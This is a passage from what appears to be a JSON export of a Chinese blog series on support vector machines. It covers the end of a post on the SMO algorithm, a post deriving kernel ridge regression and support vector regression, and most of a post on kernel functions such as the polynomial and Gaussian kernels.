0\\)也就是两个样本的特征完全相同时，这样就有问题，因为分母为0。此时采用如下启发式规则继续选择\\(\\alpha_2\\)： 在自由支持向量(\\(0 \\lt \\alpha_i \\lt C\\))上遍历，依次将其对应的变量作为\\(\\alpha_2\\)试用，直到找到\\(\\eta \\ne0\\)的变量 若1找不到合适的\\(\\alpha_2\\)，那么遍历训练数据集继续寻找 注意这里要随机选择位置，这是因为每次都从头开始遍历的话算法就会偏向靠前的变量。 极端情况下，若仍找不到合适的\\(\\alpha_2\\)，则放弃第1个\\(\\alpha_1\\)，再通过外层循环另求\\(\\alpha_1\\) 小结 关于SMO，西瓜书只有几句话的介绍，读起来一知半解，而李航老师的推导有些跳跃，新手难以看懂，因此决定总结一下。此外可以看看SMO原论文中的伪代码，这样会对过程更加了解。 除了SMO之外，还有直接在原问题上进行优化的算法（如Pegasos 以后在做介绍）。 SVM系列的介绍就告一段落啦。回想自己一开始的时候对SVM只停留在表面，原始问题知道了，不知道为啥要搞对偶问题，为什么能写出拉格朗日对偶等等，可谓菜的一比。 现在看来SVM思想也很简单，就是找间隔最大的超平面来划分数据，这样鲁棒性好。之后的一系列很多数学的推导都是为了最优化二次规划算法。包括写出拉格朗日对偶，将min max转化为 max min问题。然后在拉格朗日对偶中，我们发现w可以被线性的表示，这样更加凸显了支持向量的意义——只需要保存支持向量这些样本。此外，w可以被线性表示，进而我们使用核函数，将原本需要在高维空间的计算转化为低维空间中的计算，大大提高了效率。之后，由于样本可能有噪声数据等，盲目用核函数进行空间变换不一定是最好的，我们放宽条件，引入惩罚因子\\(\\xi_i\\)进而允许一些样本分错，令人惊奇的是惩罚因子最后并没有出现在拉格朗日对偶的目标函数中，而仅仅是要求\\(\\alpha_i \\lt C\\)。之后，我们用类似的思想用于回归问题上，类似于软边距SVM，引入管道间隔得到了SVR，然后本篇把SMO这个高效的求解方法介绍了。不得不赞叹SVM理论优美，确实一步步设计太好了。 整理完这个系列，感觉水平进步了很多，基本上常见的最优化方法都涉猎了一遍，今后打算有空实现一下SVM。 在此感谢林轩田老师的《机器学习技法》，里面讲解SVM十分详细，值得一看。 以及李航老师《统计学习方法》对于推导也十分详细，但比较晦涩，适合有一定基础的同学看。 此外还有周志华老师的《机器学习》，公式较少，对于新手可能看完不知SVM推导的来龙去脉，推荐可以先看看原理，公式推导可以看本博客的深入理解SVM系列，以及林轩田老师的课程。 参考资料 《统计学习方法》 - 李航 支持向量机（五）SMO算法 SMO算法总结","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』深入理解SVM(三) - 支持向量机回归","slug":"machine-learning-support-vector-machine-2-kernel-function-regression","date":"2018-04-02T07:40:54.000Z","updated":"2020-10-19T14:35:48.808Z","comments":true,"path":"machine-learning-support-vector-machine-2-kernel-function-regression/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-support-vector-machine-2-kernel-function-regression/","excerpt":"本文尽可能通俗、详细的介绍支持向量机SVM内容。 包括： 核线性回归 支持向量机回归SVR","text":"本文尽可能通俗、详细的介绍支持向量机SVM内容。 包括： 核线性回归 支持向量机回归SVR 核线性回归 现在我们来讨论回归问题，之前我们讲过带正则项的线性回归（岭回归），现在我们也想要将它核化。能核化的理论依据我们之前已经证明过了，即表示定理： 对于任何带有L2正则化的线性模型 \\[ \\min_{\\bf w}\\hspace{2ex}\\frac{\\lambda}{n}{\\bf w^\\mathsf{T}w} + \\frac{1}{n}\\sum_{i=1}^n {\\rm err}(y_i, {\\bf w^\\mathsf{T}z}_i) \\] 其最优的\\({\\bf w_*}=\\sum_{i=1}^n\\beta_i{\\bf z_i}\\) 首先写出原始的带正则项的线性回归， 并进行核化，然后写成矩阵的形式： \\[ \\begin{align*} &amp;\\min_{\\bf w}\\hspace{2ex}\\frac{\\lambda}{n}{\\bf w^\\mathsf{T}w} + \\frac{1}{n}\\sum_{i=1}^n(y_i - {\\bf w^\\mathsf{T}z}_i)^2 \\\\ \\Rightarrow &amp;\\min_{\\bf \\boldsymbol\\beta}\\hspace{2ex}\\frac{\\lambda}{n}\\sum_{i=1}^n\\sum_{j=1}^n\\beta_i\\beta_jK({\\bf x_i},{\\bf x_j}) + \\frac{1}{n}\\sum_{i=1}^n(y_i - \\sum_{j = 1}^n\\beta_jK({\\bf x_i},{\\bf x_j}))^2 \\\\\\Rightarrow &amp;\\min_{\\bf \\boldsymbol\\beta}\\hspace{2ex}\\frac{\\lambda}{n} \\boldsymbol{\\beta}^\\mathsf{T}{\\rm K}\\boldsymbol{\\beta} + \\frac{1}{n}|\\!|{\\bf y}- {\\bf K}{\\boldsymbol \\beta} |\\!|^2\\\\ \\Rightarrow &amp; \\min_\\boldsymbol{\\beta}\\hspace{2ex}\\frac{\\lambda}{n}\\boldsymbol{\\beta}^\\mathsf{T}{\\rm K}\\boldsymbol{\\beta} + \\frac{1}{n}(\\boldsymbol{\\beta}^\\mathsf{T}{\\rm K^\\mathsf{T}K}\\boldsymbol{\\beta} - 2\\boldsymbol{\\beta}^\\mathsf{T}{\\rm K}^\\mathsf{T}{\\bf y} + {\\bf y^\\mathsf{T}y}) \\end{align*} \\] 对\\(\\beta\\)求偏导，并令偏导为0。注意由Mercer定理知道K为对称的半正定矩阵，得： \\[ \\begin{align*} \\nabla E_{\\rm aug}(\\boldsymbol{\\beta}) &amp;= \\frac{2}{n}(\\lambda {\\rm K^\\mathsf{T}I}\\boldsymbol{\\beta} + {\\rm K^\\mathsf{T}K}{\\boldsymbol{\\beta} } - {\\rm K^\\mathsf{T} }{\\bf y}) = \\frac{2}{n}{\\rm K^\\mathsf{T}((\\lambda{\\rm I+K})\\boldsymbol{\\beta} - {\\bf y})} = 0 \\\\ &amp;\\Rightarrow \\boldsymbol{\\beta} = (\\lambda{\\rm I+K})^{-1}{\\bf y} \\end{align*} \\] 因为K为半正定矩阵且\\(\\lambda \\gt 0\\)，因此\\(\\lambda{\\rm I+K}\\)是可逆的。求解该问题复杂度\\(O(n^3)\\)，就是求逆矩阵的复杂度。预测时需要\\(O(n)\\)的复杂度。 带正则项的线性回归中, \\({\\bf w} = {\\rm (\\lambda I + X^\\mathsf{T}X)^{-1}X^\\mathsf{T} }{\\bf y)}\\)，求解复杂度\\(O(d^3 + d^2n)\\), 预测时间\\(O(d)\\)。 核线性回归得到的模型相比带正则项的线性回归来说更灵活，但不适合处理大数据。此外，核线性回归得到的结果时稠密的，因为\\(\\beta\\)和核矩阵K有关，而K中的值基本上不是0（除非两个向量垂直，否则一般不是0）。 支持向量回归SVR 上面提到的核线性回归得到的解不稀疏，计算存储开销大，有没有办法得到稀疏的解呢？ 传统的回归模型采用的是模型输出f(x)与真实值y之间的差别计算损失，只有二者完全相同的时候，损失才为0。这样可能太苛刻了，如果适当的放宽条件，假设f(x)和y之间最多有\\(\\epsilon\\)的差距，即当\\(|f({\\bf x}) - y| &gt; \\epsilon\\)时才计算损失，即： \\[ \\rm error(y,f({\\bf x})) = \\max(0, | f({\\bf x}) - y | -\\epsilon) \\] 这种回归任务称为管道回归(tube regression)，对应的损失函数称为 \\(\\epsilon\\)-不敏感损失(\\(\\epsilon\\)-insensitive error)。用大白话说，管道回归希望落在管道内。 周志华老师给出了一个直观的图如下： svr-tube-regression 对比均方损失如下图： svr-tube-vs-square-error 可以看出当\\(|f({\\bf x}) - y|\\)比较小的时候，管道回归的误差与平方误差大致相等。当\\(|f({\\bf x}) - y|\\)比较大时，管道回归的误差又远小于均方误差，说明管道回归的误差受离群点影响更小。 SVR原始问题 管道回归的目标函数可形式化为： \\[ \\min_{ {\\bf w}, b}\\hspace{2ex}\\frac{1}{2}{\\bf w^\\mathsf{T}w} + C\\sum_{i=1}^n\\max(0, |{\\bf w^\\mathsf{T}x}_i+b-y_i|-\\epsilon)\\tag{2-1} \\] 和hinge损失一样，采用了max所以不是处处可微的，因此使用微分的方法会遇到问题。想想软间隔的SVM和采用hinge损失并带正则化的目标函数的转化，是的，引入边界破坏量\\(\\xi\\)我们可以将2-1写成二次规划问题： \\[ \\begin{align*} \\min_{ {\\bf w},b, \\boldsymbol{\\xi} }\\hspace{2ex}&amp;\\frac{1}{2}{\\bf w^\\mathsf{T}w} + C\\sum_{i=1}^n\\xi_i \\\\ {\\rm s.t.}\\hspace{2ex}&amp; |y_i -({\\bf w^\\mathsf{T}x}_i+ b) |\\le \\epsilon + \\xi_i \\\\ \\hspace{2ex}&amp; \\xi_i \\ge 0, \\end{align*} \\] 但是这样还不是一个二次规划问题，因为有绝对值，为此需要两个变量: \\[ \\begin{align*} \\min_{ {\\bf w},b, \\boldsymbol{\\xi}^\\lor, \\boldsymbol{\\xi}^\\land}\\hspace{2ex}&amp;\\frac{1}{2}{\\bf w^\\mathsf{T}w} + C\\sum_{i=1}^n(\\xi_i^\\lor + \\xi_i^\\land) \\tag{2-2} \\\\ {\\rm s.t.}\\hspace{2ex}&amp; -\\epsilon - \\xi_i^\\lor \\le y_i -({\\bf w^\\mathsf{T}x}_i+ b) \\le \\epsilon + \\xi_i^\\land \\\\ \\hspace{2ex}&amp; \\xi_i^\\lor \\ge 0, \\\\ \\hspace{2ex}&amp; \\xi_i^\\land \\ge 0 \\end{align*} \\] 这里有两个\\(\\xi\\)，一个是\\(\\xi_i^\\lor\\)一个是\\(\\xi_i^\\land\\)，分别y在预测值的下方（小于预测值）和在预测值上方（大于预测值f(x))。 SVR对偶问题 到这里应该很熟悉如何推导了吧，毕竟之前已经从硬边距、软边距都推导了一遍。 首先同样写出拉格朗日函数： \\[ \\begin{align} \\mathcal{L}({\\bf w},b, {\\boldsymbol \\xi}^\\lor, {\\boldsymbol \\xi}^\\land,{\\boldsymbol \\alpha}^\\lor,{\\boldsymbol \\alpha}^\\land, {\\boldsymbol \\beta}^\\lor,{\\boldsymbol \\beta}^\\land) = \\frac{1}{2}{\\bf w^\\mathsf{T}w} + C\\sum_{i=1}^n(\\xi_i^\\lor + \\xi_i^\\land) + \\sum_{i=1}^n\\alpha_i^\\land\\left(y_i - ({\\bf w^T}x_i + b) - \\epsilon - \\xi_i^\\land \\right) \\\\ +\\sum_{i=1}^n\\alpha_i^\\lor\\left(-y_i + ({\\bf w^T}x_i + b) - \\epsilon - \\xi_i^\\lor \\right) - \\sum_{i=1}^n\\beta_i^\\land\\xi_i^\\land - \\sum_{i=1}^n\\beta_i^\\lor\\xi_i^\\lor \\tag{2-3} \\end{align} \\] \\(\\mathcal{L}({\\bf w},b, {\\boldsymbol \\xi}, {\\boldsymbol \\alpha}, {\\boldsymbol \\beta})\\)对\\({\\bf w}, b, \\xi_i^\\land ,\\xi_i^\\lor\\)求偏导得： \\[ \\begin{align*} \\frac{\\partial \\mathcal{L} }{\\partial \\bf w} &amp;= {\\bf w}- \\sum_{i=1}^n\\alpha_i^\\land {\\bf x_i} +\\sum_{i=1}^n\\alpha_i^\\lor{\\bf x_i}=0\\\\ \\frac{\\partial \\mathcal{L} }{\\partial b } &amp;= -\\sum_{i=1}^n\\alpha_i^\\land + \\sum_{i=1}^n\\alpha_i^\\lor =0\\\\ \\frac{\\partial \\mathcal{L} }{\\partial \\xi_i^\\land} &amp;= C - \\alpha_i^\\land - \\beta_i^\\land =0\\\\ \\frac{\\partial \\mathcal{L} }{\\partial \\xi_i^\\lor} &amp;= C - \\alpha_i^\\lor - \\beta_i^\\lor =0\\\\ \\end{align*} \\] 整理得： \\[ \\begin{align*} \\tag{2-4} {\\bf w} = \\sum_{i=1}^n(\\alpha_i^\\land - \\alpha_i^\\lor){\\bf x_i}\\\\ \\sum_{i=1}^n(\\alpha_i^\\lor - \\alpha_i^\\land ) = 0\\\\ C =\\alpha_i^\\land + \\beta_i^\\land \\\\ C = \\alpha_i^\\lor + \\beta_i^\\lor\\\\ \\end{align*} \\] 将2-4带入2-3得： \\[ \\begin{align} \\min_{ {\\bf w}, b,{\\boldsymbol \\xi}^\\lor, {\\boldsymbol \\xi}^\\land}\\mathcal{L}({\\bf w},b, {\\boldsymbol \\xi}^\\lor, {\\boldsymbol \\xi}^\\land,{\\boldsymbol \\alpha}^\\lor,{\\boldsymbol \\alpha}^\\land, {\\boldsymbol \\beta}^\\lor,{\\boldsymbol \\beta}^\\land) = \\sum_{i=1}^ny_i(\\alpha_i^\\land - \\alpha_i^\\lor ) - \\epsilon (\\alpha_i^\\land + \\alpha_i^\\lor )- \\frac{1}{2}\\sum_{i=1}^n\\sum_{j=1}^n(\\alpha_i^\\land - \\alpha_i^\\lor )(\\alpha_j^\\land - \\alpha_j^\\lor ){\\bf x_i^T x_j} \\tag{2-5} \\end{align} \\] 在对2-5求极大得到SVR的对偶问题： \\[ \\begin{align*} \\max_{ {\\boldsymbol \\alpha^\\lor, \\alpha^\\land} }\\hspace{2ex}&amp; \\sum_{i=1}^ny_i(\\alpha_i^\\land - \\alpha_i^\\lor ) - \\epsilon (\\alpha_i^\\land + \\alpha_i^\\lor )- \\frac{1}{2}\\sum_{i=1}^n\\sum_{j=1}^n(\\alpha_i^\\land - \\alpha_i^\\lor )(\\alpha_j^\\land - \\alpha_j^\\lor ){\\bf x_i^T x_j} \\tag{2-6}\\\\ {\\rm s.t.} \\hspace{2ex} &amp; \\sum_{i=1}^n(\\alpha_i^\\lor - \\alpha_i^\\land ) = 0\\\\ \\hspace{2ex} &amp; 0 \\le \\alpha_i^\\land ,\\alpha_i^\\lor\\le C \\end{align*} \\] 和以往一样，我们省略2-4中的w，并用等式约束消去了\\(\\beta_i^\\lor, \\beta_i^\\land\\)。 OK，接下来是KKT条件： 主问题可行: \\(-\\epsilon - \\xi_i^\\lor \\le y_i -({\\bf w^\\mathsf{T}x}_i+ b) \\le \\epsilon + \\xi_i^\\land ;\\hspace{2ex} \\xi_i^\\lor \\ge 0; \\hspace{2ex} \\xi_i^\\land \\ge 0\\) 对偶问题可行: \\(\\alpha_i^\\land ,\\alpha_i^\\lor \\ge 0; \\hspace{2ex} \\beta_i^\\lor, \\beta_i^\\land \\ge0\\) 互补松弛：\\(\\alpha_i^\\land\\left(y_i - ({\\bf w^T}x_i + b) - \\epsilon - \\xi_i^\\land \\right) =0; \\hspace{2ex} \\alpha_i^\\lor\\left(-y_i + ({\\bf w^T}x_i + b) - \\epsilon - \\xi_i^\\lor \\right)=0; \\hspace{2ex} \\beta_i^\\land\\xi_i^\\land = 0 \\hspace{2ex} \\beta_i^\\lor\\xi_i^\\lor = 0\\) 2-4的条件\\({\\bf w} = \\sum_{i=1}^n(\\alpha_i^\\land - \\alpha_i^\\lor){\\bf x_i}; \\hspace{2ex} \\sum_{i=1}^n(\\alpha_i^\\lor - \\alpha_i^\\land ) = 0 ; \\hspace{2ex} C =\\alpha_i^\\land + \\beta_i^\\land; \\hspace{2ex} C = \\alpha_i^\\lor + \\beta_i^\\lor\\) 此外，还加上两条：\\(\\alpha_i^\\land \\alpha_i^\\lor = 0; \\hspace{2ex}\\xi_i^\\land \\xi_i^\\lor = 0;\\)这是因为y不可能同时出现在预测值f(x)的上方和下方，因此它们至少一个为0。 稀疏性讨论 SVR的目的是想要一个稀疏的解。那么我们根据对偶问题求解出的是稀疏的么？ 前面的KKT可知 \\({\\bf w} = \\sum_{i=1}^n(\\alpha_i^\\land - \\alpha_i^\\lor){\\bf x_i}\\)，记\\(\\beta_i = \\alpha_i^\\land - \\alpha_i^\\lor\\) 要证明的就是\\(\\beta_i\\)组成的向量\\(\\boldsymbol \\beta\\)是稀疏的。 对于在管道中的可以利用互补松弛性可以做如下推导： \\[ \\begin{align*} &amp; |{\\bf w^Tx_i } +b - y_i | \\lt \\epsilon \\\\ \\Rightarrow \\hspace{1ex}&amp; \\xi_i^\\lor = \\xi_i^\\land = 0\\\\ \\Rightarrow \\hspace{1ex}&amp; y_i - ({\\bf w^T}x_i + b) - \\epsilon - \\xi_i^\\land \\ne0; \\hspace{2ex} -y_i + ({\\bf w^T}x_i + b) - \\epsilon - \\xi_i^\\lor \\ne0;\\\\ \\Rightarrow \\hspace{1ex} &amp;\\alpha_i^\\land =0 ; \\hspace{2ex}\\alpha_i^\\lor=0\\\\ \\Rightarrow \\hspace{1ex} &amp;\\beta_i = \\alpha_i^\\land - \\alpha_i^\\lor = 0\\\\ \\end{align*} \\] 只有不在管道中\\(\\beta_i \\ne 0\\)，此时为支持向量。显然SVR的支持向量仅为训练样本的一部分，即其解具有稀疏性。 核函数 SVR仍可以核函数： \\[ \\begin{align*} f({\\bf x}) &amp;= {\\bf w^Tx} + b \\\\&amp;= \\sum_{i=1}^n(\\alpha_i^\\land - \\alpha_i^\\lor){\\bf x_i^Tx} + b \\\\&amp;= \\sum_{i=1}^n(\\alpha_i^\\land - \\alpha_i^\\lor){\\bf K}({\\bf x_i},{\\bf x}) + b \\end{align*} \\] 常见分类、回归性能比较 图来自林轩田老师： classification-and-regression-models 前两行均为线性模型，其中 - 第一行较少使用，因为性能/效果比较差 - 第二行是经典机器学习包liblinear的主力 后两行均为核模型，其中 - 第三行较少使用，因为支持向量是稠密的 - 第四行是经典机器学习包libsvm的主力 参考资料 机器学习技法 - 林轩田 《机器学习》 - 周志华","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』深入理解SVM(二) - 核函数和软边距","slug":"machine-learning-support-vector-machine-2-kernel-function-and-soft-margin-svm","date":"2018-03-24T03:54:18.000Z","updated":"2020-10-25T14:12:23.319Z","comments":true,"path":"machine-learning-support-vector-machine-2-kernel-function-and-soft-margin-svm/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-support-vector-machine-2-kernel-function-and-soft-margin-svm/","excerpt":"本文尽可能通俗、详细的介绍支持向量机SVM内容。 包括 核函数 软边距SVM 其它 Hinge损失 概率SVM 核化逻辑回归","text":"本文尽可能通俗、详细的介绍支持向量机SVM内容。 包括 核函数 软边距SVM 其它 Hinge损失 概率SVM 核化逻辑回归 核函数 若我们将原始数据从\\(R^d\\)空间通过\\(\\bf z = \\Phi(x)\\)映射到高维空间\\(R^\\tilde d\\)以解决线性不可分的问题，则SVM原始问题为： \\[ \\begin{align*} \\min_{\\bf w,b}\\hspace{3ex} &amp; \\frac{1}{2} {\\bf w^Tw}\\\\ {\\rm st.}\\hspace{3ex} &amp; y_i({\\bf w^T z} + b) \\ge 1, \\hspace{3ex}i=1,2,\\cdots ,n \\end{align*} \\] SVM的对偶问题为： \\[ \\begin{align*} \\max_{ {\\boldsymbol \\alpha} }&amp; \\hspace{3ex}\\sum_{i=1}^n\\alpha_i-\\frac{1}{2} \\sum_{i=1}^n\\sum_{j=1}^n \\alpha_i\\alpha_jy_iy_j{\\bf z_i^Tz_j}\\\\ {\\rm s.t.} &amp; \\hspace{3ex} \\alpha_i \\ge 0, i = 1,2,\\cdots ,n\\\\ &amp; \\hspace{3ex} \\sum_{i=1}^n \\alpha_iy_i = 0 \\end{align*} \\] 上一篇博文最后提到，对偶问题仍然依赖于数据维度\\(\\tilde d\\)，因为有\\(\\bf z_i^Tz_j\\)内积运算。当新空间维度很大，甚至是无穷维的时候，这将成为一个计算的瓶颈。 核技巧和核函数 注意\\({\\bf z_i^Tz_j = \\Phi(x_i)^T \\Phi(x_j)}\\)的计算顺序如下： 先进行空间变换 进行内积 如果将两步合并，会不会快一点？ 林轩田老师举了一个简单的例子（为了简单表示，将\\(x_1x_2\\)和\\(x_2x_1\\)都放了进来） \\[ \\boldsymbol{\\Phi}({\\bf x}) = (1, x_1, x_2, \\ldots, x_d, x_1^2, x_1x_2, \\ldots ,x_1x_d, x_2x_1, x_2^2, \\ldots ,x_2x_d, \\ldots, x_d^2) \\] 假设两个数据点\\({\\bf x, x&#39;}\\)进行内积，结果如下（常数项、一次项、二次项） \\[ \\begin{align*} \\boldsymbol{\\Phi}({\\bf x})^\\mathsf{T}\\boldsymbol{\\Phi}({\\bf x}&#39;) &amp;= 1 +\\sum_{i=1}^dx_ix_i&#39; + \\sum_{i=1}^d\\sum_{j=1}^dx_ix_jx_i&#39;x_j&#39; \\\\ &amp;= 1+\\sum_{i=1}^dx_ix_i&#39; + \\sum_{i=1}^d x_ix_i&#39;\\sum_{j=1}^dx_jx_j&#39; \\\\ &amp;= 1 + {\\bf x}^\\mathsf{T}{\\bf x}&#39; + ({\\bf x}^\\mathsf{T}{\\bf x}&#39;)({\\bf x}^\\mathsf{T}{\\bf x}&#39;) \\end{align*} \\] 可以看出，先转换再进行内积的操作和我们直接在原空间进行\\(1 + {\\bf x}^\\mathsf{T}{\\bf x}&#39; + ({\\bf x}^\\mathsf{T}{\\bf x}&#39;)({\\bf x}^\\mathsf{T}{\\bf x}&#39;)\\)的内积结果是一样的。 因此，在某些情况下，如果把变换和内积这两个步骤合起来，计算效率可以得到提高。 转换+内积合并为一步称为核技巧，换句话说，核技巧是要找一个核函数K，使得 \\[ K_\\boldsymbol{\\Phi}({\\bf x}, {\\bf x}&#39;) \\equiv \\boldsymbol{\\Phi}({\\bf x})^\\mathsf{T}\\boldsymbol{\\Phi}({\\bf x}&#39;) \\] 上面简单的例子中，核函数为 \\[ K_{\\boldsymbol{\\Phi} }({\\bf x}, {\\bf x}&#39;) = 1 + {\\bf x}^\\mathsf{T}{\\bf x}&#39; + ({\\bf x}^\\mathsf{T}{\\bf x}&#39;)^2 \\] 有了核函数后，可以直接用核函数K在原本的d维空间计算，而不用在高维空间中计算很复杂的内积。 注意到我们的SVM对偶问题中，无论是目标函数还是决策函数，都只有输入实例核实例的内积，因此可以用核函数写为： \\[ \\begin{align*} \\max_{ {\\boldsymbol \\alpha} }&amp; \\hspace{3ex}\\sum_{i=1}^n\\alpha_i-\\frac{1}{2} \\sum_{i=1}^n\\sum_{j=1}^n \\alpha_i\\alpha_j y_iy_j K({\\bf x_i},{\\bf x_j})\\\\ {\\rm s.t.} &amp; \\hspace{3ex} \\alpha_i \\ge 0, i = 1,2,\\cdots ,m\\\\ &amp; \\hspace{3ex} \\sum_{i=1}^n \\alpha_iy_i = 0 \\end{align*} \\] 而决策函数可以写为： \\[ \\begin{align}f({\\bf {\\bf x} }) &amp;= \\rm sign \\left( {\\bf w}^T\\Phi({\\bf x}) + b \\right)\\\\ &amp;= \\rm sign \\left( \\sum_{i=1}^n \\alpha_iy_i\\Phi({\\bf x}_i)^T \\Phi({\\bf x}) + b\\right)\\\\ &amp;= \\rm sign \\left( \\sum_{i=1}^n \\alpha_iy_iK({\\bf x}_i,{\\bf x}) + b\\right) \\\\ &amp;= \\rm sign \\left( \\sum_{SV} \\alpha_iy_iK({\\bf x}_i,{\\bf x}) + b\\right) \\end{align} \\] 最后的SV表示支持向量。 于是就得到了核支持向量机。 核函数的选择 SVM引入了核函数之后，摆脱了对映射后高纬度\\(\\tilde d\\)的内积计算。因此在实际问题中，我们通过指定核函数而非映射方式\\(\\Phi(x)\\)。 核函数隐式的定义了一个特征空间，而我们希望在这个特征空间中，我们的样本线性可分。因此核函数的选择是十分重要的，如果核函数选择不合适，意味着将样本映射到了一个不合适的特征空间，很可能性能不佳。 下面介绍常见的多项式核和高斯核。 多项式核 多项式核写作: \\[ K({\\bf x}, {\\bf x}&#39;) = (\\zeta + \\gamma {\\bf x^\\mathsf{T}x}&#39;)^d \\tag{1-1} \\] 当多项式核中的\\(\\zeta = 0, \\gamma = 1, d = 1\\)时，退化为线性核。 下图为林轩田老师给出的多项式核中不同参数的效果，其中带方框的点是支持向量。 Polynomial-kernel 我们很难在训练前说哪一个比较好，往往需要进行交叉验证等来判断。 但是这个例子说明了我们把核函数换掉，SVM的边界也随之改变（说明我们需要进行核函数选择）。在实践中，应记住\"linear first\"， 从线性核这种简单模型开始尝试。 高斯核 高斯核可以方便的计算无限维度的内积，如下： \\[ \\begin{align*} K({\\bf x}, {\\bf x}&#39;) &amp;= \\exp(-({\\bf x}-{\\bf x}&#39;)^2) \\\\ &amp;= \\exp(-{\\bf x}^2)\\exp(-{\\bf x}&#39;^2)\\exp(2{\\bf xx&#39;}) \\\\ &amp;= \\exp(-{\\bf x}^2)\\exp(-{\\bf x}&#39;^2)\\left(\\sum_{i=0}^\\infty\\frac{(2{\\bf xx&#39;})^i}{i!}\\right) \\hspace{3ex}{\\rm Taylor\\ 展开} \\ \\exp(x) = \\sum_{n=0}^{\\infty} \\frac{x^n}{n!}\\\\ &amp;= \\sum_{i=0}^\\infty\\left(\\exp(-{\\bf x}^2)\\exp(-{\\bf x}&#39;^2)\\sqrt{\\frac{2^i}{i!} }\\sqrt{\\frac{2^i}{i!} } ({\\bf x})^i({\\bf x}&#39;)^i\\right) \\\\ &amp;= \\Phi({\\bf x})^\\mathsf{T}\\Phi({\\bf x}&#39;) \\end{align*} \\] 即多项式变换将x映射到一个无限维的空间中： \\[ \\Phi({\\bf x}) = \\exp(-{\\bf x}^2)\\cdot \\left(1, \\sqrt{\\frac{2}{1!} }{\\bf x}, \\sqrt{\\frac{2^2}{2!} }{\\bf x}^2,\\ldots\\right) \\] 更一般的，高斯核函数写为： \\[ K({\\bf x},{\\bf x}&#39;) = \\rm exp \\left(- \\frac{|\\!|{\\bf x} - {\\bf x}&#39;|\\!|^2}{2\\sigma^2}\\ \\right) \\tag{1-2} \\] 带入核支持向量机得到： \\[ \\begin{align*} g_{\\rm SVM}({\\bf x}) &amp;= {\\rm sign}\\left(\\sum_{\\rm SV}\\alpha_iy_i K({\\bf x}_i, {\\bf x})+b\\right) \\\\ &amp;= {\\rm sign}\\left(\\sum_{\\rm SV}\\alpha_iy_i \\exp\\left(\\frac{|\\!|{\\bf x}-{\\bf x}_i|\\!|^2}{2\\sigma^2}\\right)+b\\right) \\end{align*} \\] 上述的式子中，此时SVM实际上是以支持向量为中心的高斯函数的线性组合，因此高斯核函数通常也称为RBF核（Radial Basis Function kernel, Radial 就是长得像高斯函数的(只和\\(x_i\\)到中心\\(x\\)的距离有关)，Basis function就是拿来做线性组合的)。 至此，可以小小总结一下我们SVM一路的”进化“： 使用\\(\\bf z = \\Phi(x)\\) =&gt; 高效的核函数K(x, x') 保存最优的w， =&gt; 保存较少的支持向量和相应的\\(\\alpha_i\\) 而使用高斯核函数可以映射到无限多维空间！而我们的鲁棒性保证则是最大边界的性质。 当然，SVM也是会过拟合的。 林轩田老师又给出了下面的图： gaussian-kernel-function 注：林轩田老师的高斯核函数为\\(K({\\bf x},{\\bf x}&#39;) = \\rm e{\\bf x}p \\left(- \\gamma|\\!|{\\bf x} - {\\bf x}&#39;|\\!|^2\\ \\right)\\)，和本文的其实是一样的 可以看出，\\(\\gamma\\)越大，高斯函数越尖锐，模型越容易过拟合。可以想象，当\\(\\gamma \\rightarrow \\infty\\)时，高斯函数\\(K({\\bf x}, {\\bf x}&#39;) = [\\![{\\bf x} = {\\bf x}&#39;]\\!]\\) 核函数比较 线性核函数\\(K({\\bf x, x}&#39;) = {\\bf x^Tx}&#39;\\) 实际上没有进行特征空间变换。最安全也最快。最后得到的模型可解释性强：w会给出每个特征的权重，支持向量会给出每个数据点的重要性。缺点是：数据可能不是线性可分的。对文本数据通常使用线性核函数。 多项式核\\(K({\\bf x}, {\\bf x}&#39;) = (\\zeta + \\gamma {\\bf x^\\mathsf{T}x}&#39;)^d\\)比线性核更通用，参数d直接描述了被映射空间的复杂度。但它参数较多，调参较难。多项式核可能适用于d比较小的场景，因为当d很大的时候计算不稳定。不稳定表现在：当\\(|\\zeta + \\gamma {\\bf x^\\mathsf{T}x}&#39; | \\lt 1\\)时，核函数逼近0，当\\(|\\zeta + \\gamma {\\bf x^\\mathsf{T}x}&#39; | \\gt 1\\),核函数值会非常大。 高斯核\\(K({\\bf x},{\\bf x}&#39;) = \\rm e{\\bf x}p \\left(- \\frac{|\\!|{\\bf x} - {\\bf x}&#39;|\\!|^2}{2\\sigma^2}\\ \\right)\\),可以计算出更复杂的边界，相比多项式核只有一个参数，容易调参。但是由于映射到了无限维空间，没有一个直观的w来解释模型。此外，它的计算也比较复杂，容易过拟合。 核函数的性质 核函数实际上是x和x'映射到新的特征空间的相似度衡量。（向量本身就表示相似性，如正交的时候我们就说一点都不像）。当然不是所有的相似性都能用一个合法的核函数表示。如果一个函数K是合法的核函数，K必须满足下面两个条件（Mercer条件）： K是对称的 K必须是半正定的 此外，核函数还可以通过函数组合得到， K1，K2为核函数，对于任意正数\\(\\gamma_1, \\gamma_2\\)，其线性组合也是核函数： \\(\\gamma_1K_1 + \\gamma_2K_2\\) K1，K2为核函数，核函数的直积也是核函数：\\(K1\\otimes K_2({\\bf x,z}) = K_1({\\bf x,z})K_2({\\bf x,z})\\) K1为核函数，则对于任意函数g(x)， \\(g({\\bf x})k_1({\\bf x, z})g({\\bf z})\\)也是核函数 软间隔SVM 